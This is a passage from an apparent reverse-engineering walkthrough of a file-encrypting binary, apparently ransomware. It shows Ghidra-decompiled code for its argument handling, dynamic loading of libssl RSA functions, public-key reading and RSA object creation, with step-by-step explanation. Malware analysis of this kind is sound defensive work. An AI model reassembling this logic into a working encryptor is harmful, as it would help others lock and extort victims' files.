</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> (<span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">encrypt_file</span>(<span style="color:#56b6c2">*</span>(<span style="color:#e06c75">undefined8</span> <span style="color:#56b6c2">*</span>)(<span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x10</span>),<span style="color:#e06c75">local_20</span>,<span style="color:#e06c75">local_28</span>,<span style="color:#e06c75">local_30</span>,<span style="color:#e06c75">local_38</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">if</span> (<span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;encrypt_file&#34;</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">5</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>          <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;create_rsa_obj&#34;</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">4</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;get_pk_data&#34;</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">3</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#61afef;font-weight:bold">printf</span>(<span style="color:#98c379">&#34;init_libssl returned %d</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>,(<span style="color:#e06c75">ulong</span>)<span style="color:#e06c75">local_c</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">2</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">return</span> <span style="color:#e06c75">local_4c</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Let&rsquo;s break down what we&rsquo;re seeing here.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">undefined4</span> <span style="color:#61afef;font-weight:bold">main</span>(<span style="color:#e5c07b">int</span> <span style="color:#e06c75">param_1</span>,<span style="color:#e5c07b">long</span> <span style="color:#e06c75">param_2</span>)
</span></span></code></pre></div><p>We can see that the <code>main</code> function will take in 2 parameters. In C programs, these 2 parameters will usually be <code>argc</code> and <code>argv</code>. <code>argc</code> is the argument counter and <code>argv</code> is the array that holds all the arguments.</p>
<p>Just to make it easier to analyze this binary, I&rsquo;ll rename the symbols as we analyze them. I&rsquo;ll rename <code>param_1</code> to <code>argc</code> because <code>param_1</code> is definitely the argument counter. And I&rsquo;ll rename <code>param_2</code> to <code>argv</code>.</p>
<p>Since <code>param_2</code>&rsquo;s type is <code>long</code>, I&rsquo;ll change it back to being <code>char**</code> using Ghidra&rsquo;s retype variable feature.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">argc</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#d19a66">3</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;usage: encrypt &lt;public_key&gt; &lt;file_to_encrypt&gt; [&lt;enc_step&gt;] [&lt;enc_size&gt;] [&lt;file_size&gt;]&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;       enc_step   -   number of MB to skip while encryption&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;       enc_size   -   number of MB in encryption block&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;       file_size  -   file size in bytes (for sparse files)</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We can see there&rsquo;s a usage text here. So we need 3 arguments for this program or this message will show up. And we can see that this binary needs a public key and a path to the file to be encrypted.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#d19a66">3</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">argc</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">atoi</span>(<span style="color:#e06c75">argv</span>[<span style="color:#d19a66">3</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_28</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#d19a66">4</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">argc</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">atoi</span>(<span style="color:#e06c75">argv</span>[<span style="color:#d19a66">4</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_30</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#d19a66">5</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">argc</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">atoi</span>(<span style="color:#e06c75">argv</span>[<span style="color:#d19a66">5</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_38</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Here, we can see that it checks for additional arguments. These addtional arguments are specified in the <em>usage</em> message.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">local_c</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">init_libssl</span>();
</span></span></code></pre></div><p>Here, the program calls the <code>init_libssl()</code> function, that looks quite interesting so let&rsquo;s break that function down and see what happens there.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">plibssl</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlopen</span>(<span style="color:#98c379">&#34;libssl.so&#34;</span>,<span style="color:#d19a66">2</span>);
</span></span></code></pre></div><p>We can see that this function will use <code>dlopen()</code> which uses the linker to open a <code>libssl.so</code> file. A linker is a program that links external object files with the current program.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">plibssl</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">for</span> (<span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>; (<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#d19a66">0x10</span>; <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">sprintf</span>(<span style="color:#e06c75">local_38</span>,<span style="color:#98c379">&#34;libssl.so.%d&#34;</span>,(<span style="color:#e06c75">ulong</span>)<span style="color:#e06c75">local_3c</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">plibssl</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlopen</span>(<span style="color:#e06c75">local_38</span>,<span style="color:#d19a66">2</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#e06c75">plibssl</span> <span style="color:#56b6c2">!=</span> <span style="color:#d19a66">0</span>) <span style="color:#c678dd">break</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">plibssl</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">goto</span> <span style="color:#e06c75">LAB_00400de1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Next, we can see that if <code>plibssl == 0</code> which means if the previous <code>dlopen()</code> function fails, it will try to find some version of <code>libssl.so</code> via <code>&quot;libssl.so.%d&quot;</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">lBIO_new_mem_buf</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;BIO_new_mem_buf&#34;</span>);
</span></span></code></pre></div><p>After it finds a <code>libssl.so</code>, it uses <code>dlsym()</code> to dynamically load the <code>BIO_new_mem_buf</code> symbol from the libssl at runtime.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">lERR_error_string</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;ERR_error_string&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">lERR_error_string</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">4</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">lPEM_read_bio_RSA_PUBKEY</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;PEM_read_bio_RSA_PUBKEY&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lPEM_read_bio_RSA_PUBKEY</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">5</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">lPEM_read_bio_RSAPrivateKey</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;PEM_read_bio_RSAPrivateKey&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lPEM_read_bio_RSAPrivateKey</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">6</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">lRAND_pseudo_bytes</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;RAND_pseudo_bytes&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lRAND_pseudo_bytes</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">7</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">lRSA_public_encrypt</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;RSA_public_encrypt&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lRSA_public_encrypt</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">8</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">lRSA_private_decrypt</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;RSA_private_decrypt&#34;</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lRSA_private_decrypt</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">9</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">lRSA_size</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;RSA_size&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lRSA_size</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>              <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">10</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>              <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This section is doing pretty much the same thing as before. So it&rsquo;s trying to grab a bunch of different functions to call later on. We derive what this program wants to do from these functions.</p>
<p>It&rsquo;s trying to get <code>PEM_read_bio_RSA_PUBKEY</code> to read an RSA public key, it&rsquo;s trying to get <code>PEM_read_bio_RSAPrivateKey</code> to read an RSA private key, it&rsquo;s trying to get <code>RAND_pseudo_bytes</code> to generate random bytes, which will probably be used for encrypting the files, etc. So we can guess that this is loading a bunch of different <strong>RSA</strong> functions to use for encrypting.</p>
<p>So that&rsquo;s the <code>init_libssl()</code> function, it&rsquo;s loading in some functions from <code>libssl</code> for the program. Let&rsquo;s go back to the <code>main</code> function and continue analyzing.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">get_pk_data</span>(<span style="color:#e06c75">argv</span>[<span style="color:#d19a66">1</span>],<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_18</span>);
</span></span></code></pre></div><p>We can see that it&rsquo;s calling another function called <code>get_pk_data()</code>. I&rsquo;m assuming <code>pk</code> means public key because we are trying to encrypt the files and we use public key to encrypt files in asymmetric encryption as I&rsquo;ve mentioned earlier.</p>
<p>Still, let&rsquo;s jump into the function and see what it does.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">__fd</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">open_read</span>(<span style="color:#e06c75">param_1</span>);
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">__fd</span> <span style="color:#56b6c2">==</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;open_pk_file&#34;</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This is reading from a file. I&rsquo;m assuming it&rsquo;s the public key file.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">__nbytes</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">lseek</span>(<span style="color:#e06c75">__fd</span>,<span style="color:#d19a66">0</span>,<span style="color:#d19a66">2</span>);
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">__nbytes</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0xffffffffffffffff</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;lseek [end]&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">2</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#e06c75">__nbytes</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;get_pk_data: key file is empty!&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">3</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This is using <code>lseek()</code> to seek to the end of the file and make sure that the file is not empty.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">pvVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">calloc</span>(<span style="color:#e06c75">__nbytes</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">1</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pvVar1</span>;
</span></span><span style="display:flex;"><span><span style="color:#e06c75">_Var2</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">lseek</span>(<span style="color:#e06c75">__fd</span>,<span style="color:#d19a66">0</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">_Var2</span> <span style="color:#56b6c2">==</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;lseek [start]&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">4</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">sVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">read</span>(<span style="color:#e06c75">__fd</span>,<span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span>,<span style="color:#e06c75">__nbytes</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">sVar3</span> <span style="color:#56b6c2">==</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">DAT_0040841e</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">5</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">close</span>(<span style="color:#e06c75">__fd</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Here, the program is basically allocating a buffer of size <code>__nbytes + 1</code> and read from the file it just opened into that buffer, the buffer gets assigned to <code>param_2</code>, it closes the file and then after this section, it just returns.</p>
<p>So in the <code>get_pk_data()</code> function, it&rsquo;s essentially just reading the public key into the second parameter. So in the main function, I&rsquo;ll rename this parameter (now <code>local_18</code>) into <code>public_key_buffer</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">create_rsa_obj</span>(<span style="color:#e06c75">public_key_buffer</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_20</span>);
</span></span></code></pre></div><p>Back in the <code>main</code> function, next up is this <code>create_rsa_obj</code> line. So this function is probably taking in the <code>public_key_buffer</code> that <code>get_pk_data()</code> just created, generate an RSA object and probably assign that object to <code>local_20</code>.</p>
<p>To make sure my assumptions are correct, let&rsquo;s jump into that function and see.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">undefined4</span> <span style="color:#61afef;font-weight:bold">create_rsa_obj</span>(<span style="color:#e06c75">undefined8</span> <span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">undefined8</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">long</span> <span style="color:#e06c75">lVar1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">local_2c</span>;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">lVar1</span> <span style="color:#56b6c2">=</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">lBIO_new_mem_buf</span>)(<span style="color:#e06c75">param_1</span>,<span style="color:#d19a66">0xffffffff</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">print_error_ex</span>(<span style="color:#98c379">&#34;BIO_new_mem_buf&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_2c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">lVar1</span> <span style="color:#56b6c2">=</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">lPEM_read_bio_RSA_PUBKEY</span>)(<span style="color:#e06c75">lVar1</span>,<span style="color:#e06c75">param_2</span>,<span style="color:#d19a66">0</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#61afef;font-weight:bold">print_error_ex</span>(<span style="color:#98c379">&#34;PEM_read_bio_RSA_PUBKEY&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_2c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">2</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_2c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">return</span> <span style="color:#e06c75">local_2c</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This is pretty short and easy to understand so I&rsquo;ll go over it quickly. So we can see that it is calling a <em>Basic I/O memory buffer</em> function, it reads from that buffer, it creates an RSA public key object from the <code>public_key_buffer</code> and it assigns the object to <code>param_2</code>, which in our case is <code>local_20</code>. So let&rsquo;s rename <code>local_20</code> into <code>rsa_key_object</code>.</p>
